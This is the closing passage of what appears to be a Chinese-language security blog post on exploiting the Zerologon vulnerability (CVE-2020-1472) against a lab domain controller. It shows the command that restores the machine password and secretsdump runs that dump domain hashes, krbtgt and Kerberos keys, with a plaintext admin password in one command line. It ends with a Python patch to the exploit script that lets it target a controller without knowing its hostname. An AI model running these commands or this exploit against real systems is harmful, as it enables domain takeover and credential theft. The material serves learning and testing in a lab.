<pre><code>使用获取到的dc计算机账户原始NT HASH中$MACHINE.ACC:plain_password_hex:的值进行操作。这里为
cc82ae2dcf9e5b8e4b8468c439d4d4babaab37f8fc505a4c5c0516c69d9d6981b0e47794d62ea3ca3421a6c08c9283d2d462a5c433ee609c5d9bb1ea0bfc30adff826400309b83bbc5290b5a14859c7e39b2cc150441540eaa256bb28cec0d3693a5a7977aa61800289bb1f5e8b4b5746a5472f71524bf391626c7d472c29119b91232abde9c58c44d8c2ed199db06166cf85ffb81372ee48a29cb2e7c1f966b63a39e5162c4b466ecbce5ff0a5147fcbcef2b93d504e3bb0a070fe0c17314ff0d5ca6eab46d4c610c89fde6da1bc863e4ea68e041d32670afa6d01e8bb179262c7c6cd36fce8cbb7d8f14bf04eeecca</code></pre><pre><code>C:\&gt;reinstall_original_pw.exe dc 192.168.1.12 cc82ae2dcf9e5b8e4b8468c439d4d4babaab37f8fc505a4c5c0516c69d9d6981b0e47794d62ea3ca3421a6c08c9283d2d462a5c433ee609c5d9bb1ea0bfc30adff826400309b83bbc5290b5a14859c7e39b2cc150441540eaa256bb28cec0d3693a5a7977aa61800289bb1f5e8b4b5746a5472f71524bf391626c7d472c29119b91232abde9c58c44d8c2ed199db06166cf85ffb81372ee48a29cb2e7c1f966b63a39e5162c4b466ecbce5ff0a5147fcbcef2b93d504e3bb0a070fe0c17314ff0d5ca6eab46d4c610c89fde6da1bc863e4ea68e041d32670afa6d01e8bb179262c7c6cd36fce8cbb7d8f14bf04eeecca
Performing authentication attempts...
=======================================================
NetrServerAuthenticate3Response
ServerCredential:
    Data:                            b&#39;z\x15\xb3\xc2r\x10\x19\x8e&#39;
NegotiateFlags:                  556793855
AccountRid:                      1001
ErrorCode:                       0


server challenge b&quot;z\n)\xd8\x1a\xfe\xa5&#39;&quot;
session key b&#39;\xb8\xe6&gt;\xee\xc9\x06h\xbfW\xfa\x9eM\xd8M\xf7\xad&#39;
NetrServerPasswordSetResponse
ReturnAuthenticator:
    Credential:
        Data:                            b&#39;\x01Z\x0c\x96\x03\x19\xcbF&#39;
    Timestamp:                       0
ErrorCode:                       0



Success! DC machine account should be restored to it&#39;s original value. You might want to secretsdump again to check.</code></pre><h3 id="测试是否恢复成功"><a href="#测试是否恢复成功" class="headerlink" title="测试是否恢复成功"></a>测试是否恢复成功</h3><hr>
<pre><code>C:\&gt;secretsdump.exe knsec.com/administrator:&quot;Knsec!@#1234&quot;@192.168.1.12
Cannot determine Impacket version. If running from source you should at least run &quot;python setup.py egg_info&quot;
Impacket v? - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf782775e13dd757c9c7fc639a2a30dde
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d87f71136a5365a853a430f3a4bb97d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
KNSEC\DC$:aes256-cts-hmac-sha1-96:074ee028e72881c4ccb5546621e6bf7baf64970a9358dbc2c7eebbb352d57d92
KNSEC\DC$:aes128-cts-hmac-sha1-96:1d379bb4726d90a144bfc26d7df8fa4c
KNSEC\DC$:des-cbc-md5:98d65b7cd0836e5e
KNSEC\DC$:aad3b435b51404eeaad3b435b51404ee:007c55bf5537e288d94259220c87f18c:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x0b96f071d54d6ebee95d5a3bb46444be415ec9cb
dpapi_userkey:0x40c3ee5608b387e3220d39b0a1e1a03e3f870f67
[*] NL$KM
 0000   FD D6 57 D5 4E 8F 15 C3  22 5B 76 67 76 2D C6 B6   ..W.N...&quot;[vgv-..
 0010   D7 DA 73 99 40 2D 1D D7  45 74 14 07 B0 C7 F1 99   ..s.@-..Et......
 0020   C7 FE F8 4D 56 13 3B 48  FD C3 DB 66 84 95 4E AA   ...MV.;H...f..N.
 0030   FC 9E 10 C6 95 C6 2F 19  87 C9 EB 4F 7E 21 3F 2D   ....../....O~!?-
NL$KM:fdd657d54e8f15c3225b7667762dc6b6d7da7399402d1dd745741407b0c7f199c7fef84d56133b48fdc3db6684954eaafc9e10c695c62f1987c9eb4f7e213f2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2d62adb84ec378d2ecea10e567bc9417:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5cc55a62ee304fa491446e2d0990d2ca:::
knsec.com\kntest:1106:aad3b435b51404eeaad3b435b51404ee:47bf8039a8506cd67c524a03ff84ba4e:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:cc82ae2dcf9e5b8e4b8468c439d4d4ba:::
PC1$:1104:aad3b435b51404eeaad3b435b51404ee:aa5ad52d3454baf9d0a526cbbae5532a:::
PC$:1105:aad3b435b51404eeaad3b435b51404ee:f9d8a86bf2393caf560d9cc78ea455a8:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:da6b7a6b8eb7c88bb4566483d6d82f619a4f90231169bda43566ecf816894717
krbtgt:aes128-cts-hmac-sha1-96:f170b8aeeb767bc573dcbd7068bcf7c5
krbtgt:des-cbc-md5:6bfe754c31544c4a
knsec.com\kntest:aes256-cts-hmac-sha1-96:6adedeb34bffea0fa15acbf899693e3a092bba7dbdb55b256adc7b5e642060ad
knsec.com\kntest:aes128-cts-hmac-sha1-96:26b3d4a26ba6b15e22f1a3224f50bfd6
knsec.com\kntest:des-cbc-md5:899d6d8a70294668
PC1$:aes256-cts-hmac-sha1-96:9704d3f427831f3c13a231ff6f317c1661e0d942cc478510be070a72b6e985f4
PC1$:aes128-cts-hmac-sha1-96:785f5717ba439cf2be35659b9776fc4c
PC1$:des-cbc-md5:01e9402f6451a894
PC$:aes256-cts-hmac-sha1-96:82d914a9ec6d6ee2e706133dce62e7ca5a87295ceb5fb0b11a2ea4f813fc6773
PC$:aes128-cts-hmac-sha1-96:e7a06cba47388253552e67459c8d6e3a
PC$:des-cbc-md5:13a2c2d67f159bbc
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry</code></pre><pre><code>C:\&gt;secretsdump.exe knsec.com/administrator$@192.168.1.12 -no-pass
Cannot determine Impacket version. If running from source you should at least run &quot;python setup.py egg_info&quot;
Impacket v? - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[*] Cleaning up...</code></pre><h2 id="修改cve-2020-1472-exploit源码"><a href="#修改cve-2020-1472-exploit源码" class="headerlink" title="修改cve-2020-1472-exploit源码"></a>修改cve-2020-1472-exploit源码</h2><hr>
<blockquote>
<p>通过修改cve-2020-1472-exploit的源码，使得即使不知道dc主机名也可以利用此漏洞</p>
</blockquote>
<pre><code class="python"># 新增一个函数，使用socket模块通过ip获取目标主机名
def getHostName(target):
  try:
    result = socket.gethostbyaddr(target)
    return result[0]
  except socket.herror:
    return &#39;&#39;
# 删除 if __name__ == &#39;__main__&#39;: 原来的内容，并修改成以下内容
  arglen=len(sys.argv)

  if(arglen==2):
    dc_ip=getHostName(sys.argv[1])
    dc_name=getHostName(sys.argv[1])
  elif (arglen==3):
    dc_ip=sys.argv[2]
    dc_name=sys.argv[1]
  else:
    print(&#39;Usage: CVE-2020-1472-exploit.py &lt;dc-ip&gt;&#39;)
    print(&#39;Usage: CVE-2020-1472-exploit.py &lt;dc-name&gt; &lt;dc-ip&gt;&#39;)
    print(&#39;Sets a machine account password to the empty string.&#39;)
    print(&#39;Note: dc-name should be the (NetBIOS) computer name of the domain controller.&#39;)
    sys.exit(1)
print(&#39;DCName:&#39;+dc_name)
dc_name = dc_name.rstrip(&#39;$&#39;)
perform_attack(&#39;\\\\&#39; + dc_name, dc_ip, dc_name)
</code></pre>

      
       
    </div>
</article>







    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©2020-2020 Knsec
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    

    
</style>







</html>
